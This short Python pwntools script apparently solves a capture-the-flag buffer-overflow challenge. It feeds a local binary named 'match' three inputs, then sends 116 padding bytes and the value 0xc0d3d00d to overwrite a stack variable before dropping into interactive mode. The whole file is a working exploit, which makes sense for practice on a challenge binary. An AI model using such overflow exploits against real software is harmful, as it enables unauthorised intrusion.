from pwn import *

p = process("./match")

#context.log_level="debug"

#gdb.attach(p, """break * main""")

p.recvuntil(": ")
p.sendline("A")
p.recvuntil(": ")
p.sendline("A")
p.recvuntil(": ")
p.sendline("A")

p.recvuntil(": ")


p.sendline("A"*116 + p32(0xc0d3d00d))

p.interactive()
